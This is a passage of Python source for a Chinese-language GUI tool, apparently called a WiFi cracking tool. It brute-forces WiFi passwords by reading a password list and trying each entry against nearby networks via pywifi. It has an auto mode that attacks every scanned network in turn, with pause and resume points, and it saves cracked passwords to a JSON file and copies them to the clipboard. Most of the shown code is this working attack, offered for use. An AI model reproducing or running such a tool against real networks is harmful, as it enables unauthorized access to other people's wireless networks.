                    self.win.show_msg.send(f"[警告]你当前设备的WLAN未打开或无线网卡不可用！请检查WLAN状态后再继续使用。\n\n","orange")
                else:
                    self.win.show_error.send('错误警告',f'扫描wifi时发生未知错误\n\n异常类型: {error_type}\n异常信息: {error_msg}')
                    self.win.show_msg.send(f"[错误]扫描wifi时发生未知错误 ({error_type}): {error_msg}\n\n","red")
                self.win.reset_controls_state.send()

        def auto_crack(self, start_position:int=0):
            '''
            自动破解所有WiFi
            :start_position 起始位置（用于断点续传，-1表示使用统一断点处理）
            '''
            try:
                self.is_auto = True
                self.win.show_msg.send(f"开始自动破解已扫描到的所有WiFi\n","blue")

                # 获取已经破解成功的WiFi名称列表
                cracked_ssids = [item['ssid'] for item in self.tool.pwd_dict_data]

                # 过滤掉已经破解成功的WiFi
                uncracked_ssids = [ssid for ssid in self.ssids if ssid not in cracked_ssids]

                if not uncracked_ssids:
                    self.win.show_msg.send("所有WiFi都已破解成功，无需再次破解\n", "green")
                    self.win.show_info.send('自动破解', "所有WiFi都已破解成功，无需再次破解")
                    self.is_auto = False
                    self.win.reset_controls_state.send()
                    return

                wifi_info = "待破解WiFi列表：\n"
                for i,ssid in enumerate(uncracked_ssids,1):
                    wifi_info = wifi_info+f"{('&nbsp;'*40)}({i}){('&nbsp;'*10)}{ssid}\n"
                self.win.show_msg.send(wifi_info,"blue")

                pwds = {}
                colors = {}
                for ssid in uncracked_ssids:
                    # 如果start_position为-1，表示使用统一断点处理
                    if start_position == -1:
                        # 检查是否有该WiFi的断点信息
                        if not self.tool.pwd_file_changed and ssid in self.tool.resume_info and self.tool.resume_info[ssid]['pwd_file'] == self.tool.config_settings_data['pwd_txt_path']:
                            # 直接使用断点位置
                            start_pos = self.tool.resume_info[ssid]['position']
                        else:
                            start_pos = 0
                        pwd = self.crack(ssid, start_pos)
                    else:
                        pwd = self.crack_single_wifi(ssid)
                    if isinstance(pwd,str):
                        pwds[ssid] = pwd
                        colors[ssid] = "green"
                    else:
                        pwds[ssid] = "破解失败"
                        colors[ssid] = "red"

                self.win.show_msg.send(f"自动破解已完成！\n","blue")
                crack_result_info = "结果如下：\n"
                for i,ssid in enumerate(uncracked_ssids,1):
                    crack_result_info = crack_result_info+f"<span style='color:{colors[ssid]}'>{('&nbsp;'*40)}({i}){('&nbsp;'*10)}{ssid}{('&nbsp;'*10)}{pwds[ssid]}</span>\n"

                self.win.show_msg.send(crack_result_info,"blue")
                self.win.show_info.send('自动破解',"自动破解已完成！破解结果已记录到日志中")

                self.is_auto = False
                self.win.reset_controls_state.send()
            except Exception as r:
                self.win.show_error.send('错误警告','自动破解过程中发生未知错误 %s' %(r))
                self.win.show_msg.send(f"[错误]自动破解过程中发生未知错误 {r}\n\n","red")
                self.is_auto = False
                self.win.reset_controls_state.send()
                return False

        def crack_single_wifi(self, ssid: str):
            '''
            破解单个WiFi，支持断点续传
            :ssid wifi名称
            '''
            # 检查是否有该WiFi的断点信息
            start_position = 0
            if not self.tool.pwd_file_changed and ssid in self.tool.resume_info and self.tool.resume_info[ssid]['pwd_file'] == self.tool.config_settings_data['pwd_txt_path']:
                # 直接使用断点位置
                start_position = self.tool.resume_info[ssid]['position']

            # 调用原有的破解方法
            return self.crack(ssid, start_position)

        def crack(self,ssid:str, start_position:int=0):
            '''
            破解wifi
            :ssid wifi名称
            :start_position 起始位置（用于断点续传）
            '''
            try:
                # 记录当前破解的SSID，用于断点续传
                self.current_ssid = ssid
                
                # 首先检查是否已在pwdict.json中存在该WiFi的密码
                if len(self.tool.pwd_dict_data) > 0:
                    pwd_dict_list = [ssids for ssids in self.tool.pwd_dict_data if ssids['ssid'] == ssid]
                    if len(pwd_dict_list) > 0:
                        self.win.show_msg.send(f"在密码字典中发现已破解的WiFi [{ssid}]，尝试连接...\n\n","green")
                        for i,pwd_dict in enumerate(pwd_dict_list,1):
                            # * 停止线程
                            if self.tool.run==False:
                                self.win.show_msg.send("破解已终止.\n","red")
                                self.win.reset_controls_state.send()
                                return False
                            pwd = pwd_dict['pwd']
                            result = self.connect(ssid,pwd,'json',i)
                            if result and not self.is_auto:
                                self.win.show_info.send('破解成功',f"使用字典中的密码连接成功，密码：{pwd}\n(已复制到剪切板)")
                                self.win.reset_controls_state.send()
                                return True
                            elif result:
                                return pwd
                        self.win.show_msg.send(f"已尝试完密码字典中[{ssid}]的所有密码，均连接失败\n\n","red")

                # 优化：只在必要时断开连接
                if self.iface.status() != const.IFACE_DISCONNECTED:
                    self.iface.disconnect()  # 断开所有连接
                    self.win.show_msg.send("正在断开现有连接...\n","black")
                    time.sleep(0.05)  # 优化：减少等待时间
                    if self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:  # 测试是否已经断开网卡连接
                        self.win.show_msg.send("现有连接断开成功！\n\n","black")
                    else:
                        self.win.show_msg.send("[错误]现有连接断开失败！\n\n","red")
                        return False
                self.win.show_msg.send(f"正在准备破解WiFi[{ssid}]...\n\n","black")

                self.win.show_msg.send(f"开始尝试使用密码本破解WiFi[{ssid}]...\n\n","black")
                
                # 优化：使用缓冲读取文件
                with open(self.tool.config_settings_data['pwd_txt_path'],'r', encoding='utf-8', errors='ignore') as f:
                    # 获取文件总行数（用于进度显示）
                    total_lines = sum(1 for line in f)
                    f.seek(0)  # 重置文件指针
                    
                    # 根据起始位置跳过前面的行
                    current_position = 0
                    if start_position > 0:
                        self.win.show_msg.send(f"从第 {start_position} 行开始继续破解...\n","blue")
                        for _ in range(start_position - 1):
                            next(f, None)
                            current_position += 1

                    # 启动性能监控
                    self.stats['start_time'] = time.time()
                    self.stats['attempts_count'] = 0
                    
                    # 优化：批量处理密码尝试
                    for line in f:
                        current_position += 1
                        # 记录当前位置，用于断点续传
                        self.current_position = current_position
                        
                        # * 暂停线程
                        with self.tool.crack_pause_condition:
                            if self.tool.paused:
                                self.win.show_msg.send("破解已暂停.\n","orange")
                                self.tool.crack_pause_condition.wait()
                        # * 停止线程
                        if self.tool.run==False:
                            self.win.show_msg.send("破解已终止.\n","red")
                            # 保存断点信息
                            self.tool.save_resume_info(ssid, 'txt', self.tool.config_settings_data['pwd_txt_path'], current_position)
                            self.win.reset_controls_state.send()
                            return False
                        pwd = line.strip()
                        
                        # 优化：跳过空密码和过短密码，以及超过最大长度的密码
                        if len(pwd) < 8 or len(pwd) > self.tool.config_settings_data.get('max_password_length', 63):
                            continue
                            
                        result = self.connect(ssid,pwd,'txt',current_position)
                        if result and not self.is_auto:
                            self.win.show_info.send('破解成功',"连接成功，密码：%s\n(已复制到剪切板)"%(pwd))
                            # 清除断点信息
                            self.tool.clear_resume_info(ssid)
                            self.win.reset_controls_state.send()
                            return True
                        elif result:
                            # 清除断点信息
                            self.tool.clear_resume_info(ssid)
                            return pwd
                    if not self.is_auto:
                        self.win.show_info.send('破解失败',"破解失败，已尝试完密码本中所有可能的密码")
                        # 清除断点信息
                        self.tool.clear_resume_info(ssid)
                        self.win.reset_controls_state.send()
                return False
            except Exception as r:
                self.win.show_error.send('错误警告','破解过程中发生未知错误 %s' %(r))
                self.win.show_msg.send(f"[错误]破解过程中发生未知错误 {r}\n\n","red")
                self.win.reset_controls_state.send()
                return False

        def delayed_save_resume_info(self, ssid: str, pwd_source: str, pwd_file: str, position: int):
            '''延迟保存断点信息，减少I/O操作'''
            # 更新待保存的信息
            self.pending_resume_info[ssid] = {
                'pwd_source': pwd_source,
                'pwd_file': pwd_file,
                'position': position
            }
            
            # 如果定时器未启动，则启动一个
            if self.resume_update_timer is None:
                # 创建一个线程来延迟保存
                threading.Thread(target=self._delayed_save_thread, daemon=True).start()
            else:
                # 如果定时器已启动，重新设置计时
                self._save_timer_reset = True

        def _delayed_save_thread(self):
            '''延迟保存线程'''
            self._save_timer_reset = False
            time.sleep(1.0)  # 等待1秒再保存（进一步优化）
            
            # 如果在此期间没有重置计时器，则执行保存
            if not self._save_timer_reset:
                try:
                    # 合并到主工具的resume_info中
                    for ssid, info in self.pending_resume_info.items():
                        self.tool.resume_info[ssid] = info
                    
                    # 一次性保存所有断点信息
                    with open(self.tool.resume_file_path, 'w', encoding='utf-8') as f:
                        json.dump(self.tool.resume_info, f, indent=4, ensure_ascii=False)
                    
                    # 清空待保存信息
                    self.pending_resume_info.clear()
                    self.resume_update_timer = None
                except Exception as e:
                    self.tool.show_msg(f'[警告]延迟保存断点信息失败: {e}\n', "orange")
            else:
                # 如果计时器被重置，则重新启动延迟保存
                self._delayed_save_thread()

        def connect(self, ssid, pwd, filetype, count):
            try:
                # 优化：减少不必要的断开连接操作
                current_time = time.time()
                if current_time - self.last_disconnect_time > self.disconnect_interval:
                    self.iface.disconnect()  # * 断开所有连接
                    self.last_disconnect_time = current_time
                    time.sleep(0.02)  # 减少等待时间
                else:
                    # 如果距离上次断开连接时间太短，跳过断开步骤
                    time.sleep(0.01)
                
                # * 判断安全加密类型
                akm = self.ui.cbo_security_type.currentText()
                akm_i = self.ui.cbo_security_type.currentIndex()
                akm_v = 4
                if platform.system() == "Windows":
                    from pywifi import _wifiutil_win
                    akm_dict = _wifiutil_win.akm_str_to_value_dict
                elif platform.system() == "Linux":
                    from pywifi import _wifiutil_linux
                    akm_dict = _wifiutil_linux.display_str_to_key
                if akm in akm_dict:
                    akm_v = akm_dict[akm]
                else:
                    akm_v = const.AKM_TYPE_NONE

                profile = Profile()  # * 创建wifi配置对象
                if akm_i == 0:
                    profile = self.profile_dict[ssid]
                else:
                    profile.ssid = ssid # * wifi名称
                    profile.auth = const.AUTH_ALG_OPEN  # * 网卡的开放
                    profile.akm = akm_v  # * wifi加密算法，一般是 WPA2PSK
                    profile.cipher = const.CIPHER_TYPE_CCMP # * 加密单元

                profile.key = pwd  # WiFi password
                self.iface.remove_network_profile(profile)  # Remove WiFi profile
                tem_profile = self.iface.add_network_profile(profile)  # Add new WiFi profile

                max_retries = 1
                short_interval = 0.02  # 优化：减少间隔时间

                for attempt in range(max_retries):
                    # 优化：批量更新GUI，减少频繁刷新
                    if count % 20 == 0:  # 每20次尝试更新一次GUI（进一步优化）
                        self.win.show_msg.send(f"正在进行第{count}次尝试...\n", "black")
                    
                    self.iface.connect(tem_profile)  # Connect

                    connect_start_time = time.time()
                    connect_timeout = self.connect_timeout  # 使用优化的超时时间

                    while time.time() - connect_start_time < connect_timeout:
                        time.sleep(0.01)  # 优化：减少等待间隔
                        if self.iface.status() == const.IFACE_CONNECTED:
                            self.win.show_msg.send(f"连接成功，密码：{pwd}\n\n", "green")
                            pyperclip.copy(pwd)
                            if filetype != 'json':
                                self.tool.pwd_dict_data.append({'ssid': ssid, 'pwd': pwd})
                                with open(self.tool.pwd_dict_path, 'w', encoding='utf-8') as json_file:
                                    json.dump(self.tool.pwd_dict_data, json_file, indent=4)
                            return True

                    time.sleep(short_interval)  # Short interval between retries

                # After all retries exhausted
                # 优化：减少错误日志输出频率
                if count % 100 == 0:  # 每100次失败输出一次错误日志（进一步优化）
                    self.win.show_msg.send(f"第{count}次尝试失败，密码是{pwd}\n\n", "red")
                self.iface.remove_network_profile(profile)
                return False

            except Exception as r:
                self.win.show_error.send('错误警告', '连接wifi过程中发生未知错误 %s' % (r))
                self.win.show_msg.send(f"[错误]连接wifi过程中发生未知错误 {r}\n\n", "red")
                self.win.reset_controls_state.send()
                return False


class PerformanceMonitor:
    """性能监控类"""
    def __init__(self):
        self.monitoring = False
        self.monitor_thread = None
        self.performance_data = {
            'cpu_percent': [],
            'memory_percent': [],
            'network_io': [],
            'disk_io': []
        }
        self.mode = 'balanced'  # 'balanced', 'high', 'low'
        self.set_mode(self.mode)

    def set_mode(self, mode: str):
        """设置性能模式"""
        self.mode = mode
        if mode == 'high':
            self.update_interval = 0.1  # 高性能模式：每0.1秒更新一次
        elif mode == 'low':
            self.update_interval = 1.0  # 低性能模式：每1秒更新一次
        else:  # balanced
            self.update_interval = 0.5  # 平衡模式：每0.5秒更新一次

    def start_monitoring(self):
        """开始性能监控"""
        if not self.monitoring:
            self.monitoring = True
            self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
            self.monitor_thread.start()

    def stop_monitoring(self):
        """停止性能监控"""
        self.monitoring = False
        if self.monitor_thread:
            self.monitor_thread.join(timeout=2)  # 等待最多2秒

    def _monitor_loop(self):
        """性能监控循环"""
        while self.monitoring:
            try:
                # CPU使用率
                cpu_percent = psutil.cpu_percent(interval=0.1)
                self.performance_data['cpu_percent'].append(cpu_percent)
                
                # 内存使用率
                memory_percent = psutil.virtual_memory().percent
                self.performance_data['memory_percent'].append(memory_percent)
                
                # 网络IO
                net_io = psutil.net_io_counters()
                self.performance_data['network_io'].append({
                    'bytes_sent': net_io.bytes_sent,
                    'bytes_recv': net_io.bytes_recv
                })
                
                # 磁盘IO
                disk_io = psutil.disk_io_counters()
                if disk_io:
                    self.performance_data['disk_io'].append({
                        'read_bytes': disk_io.read_bytes,
                        'write_bytes': disk_io.write_bytes
                    })
                
                # 限制数据存储大小，避免内存溢出
                for key in self.performance_data:
                    if isinstance(self.performance_data[key], list) and len(self.performance_data[key]) > 100:
                        self.performance_data[key] = self.performance_data[key][-50:]  # 保留最近50个数据点
                
                time.sleep(self.update_interval)
            except Exception:
                # 如果监控失败，继续循环
                time.sleep(self.update_interval)

    def get_current_stats(self):
        """获取当前性能统计"""
        if not self.performance_data['cpu_percent']:
            return {}
        
        return {
            'cpu_percent': self.performance_data['cpu_percent'][-1] if self.performance_data['cpu_percent'] else 0,
            'memory_percent': self.performance_data['memory_percent'][-1] if self.performance_data['memory_percent'] else 0,
            'network_io': self.performance_data['network_io'][-1] if self.performance_data['network_io'] else {},
            'disk_io': self.performance_data['disk_io'][-1] if self.performance_data['disk_io'] else {}
        }

    def get_average_stats(self):
        """获取平均性能统计"""
        if not self.performance_data['cpu_percent']:
            return {}
        
        avg_cpu = sum(self.performance_data['cpu_percent']) / len(self.performance_data['cpu_percent'])
        avg_memory = sum(self.performance_data['memory_percent']) / len(self.performance_data['memory_percent'])
        
        return {
            'avg_cpu_percent': avg_cpu,
            'avg_memory_percent': avg_memory,
            'total_network_io': self.performance_data['network_io'][-1] if self.performance_data['network_io'] else {},
            'total_disk_io': self.performance_data['disk_io'][-1] if self.performance_data['disk_io'] else {}
        }


if __name__ == "__main__":
    try:
        app = QApplication(sys.argv)

        system = platform.system()
        if system == 'Windows':
            print('当前系统是 Windows')
            import win32api,win32security,win32event # type: ignore
            #------------------- 互斥锁 -----------------------#
            MUTEX_NAME = "Global/wifi_crack_tool_mutex"
            def acquire_mutex():
                sa = win32security.SECURITY_ATTRIBUTES()
                sa.bInheritHandle = False  # 确保互斥量句柄不会被继承
                mutex = win32event.CreateMutex(sa, False, MUTEX_NAME)
                last_error = win32api.GetLastError()
                if last_error == 183:
                    return None
                elif last_error != 0:
                    raise ctypes.WinError(last_error)
                return mutex
            #==================================================#

            __mutex = None
            if PyWiFi().interfaces().__len__() <= 1:
                __mutex = acquire_mutex()

            window = MainWindow(__mutex)
            window.show()
        elif system == 'Linux':
            print('当前系统是 Linux')
            import fcntl
            #------------------- 互斥锁 -----------------------#
            LOCKFILE = "/tmp/wifi_crack_tool.lock"
            def acquire_lock():
                lock = os.open(LOCKFILE, os.O_RDWR | os.O_CREAT)
                try:
                    fcntl.flock(lock, fcntl.LOCK_EX | fcntl.LOCK_NB) # type: ignore
                    return lock
                except IOError:
                    return None

            def release_lock(lock):
                fcntl.flock(lock, fcntl.LOCK_UN) # type: ignore
                os.close(lock)
                os.remove(LOCKFILE)
            #==================================================#

            __lock = None
            if PyWiFi().interfaces().__len__() <= 1:
                __lock = acquire_lock()

            window = MainWindow(__lock)
            window.show()

        elif system == 'Darwin':  # macOS
            print('当前系统是 macOS, 暂不支持')
            sys.exit()
        else:
            print(f'当前系统为 {system}, 暂不支持')
            sys.exit()

        app.exec()

        with open(window.tool.config_file_path, 'w',encoding='utf-8') as config_file:
            json.dump(window.tool.config_settings_data, config_file, indent=4)

        sys.exit()
    finally:
        if '__mutex' in vars():
            if __mutex is not None:
                win32api.CloseHandle(__mutex)
        elif '__lock' in vars():
            if __lock is not None:
                release_lock(__lock)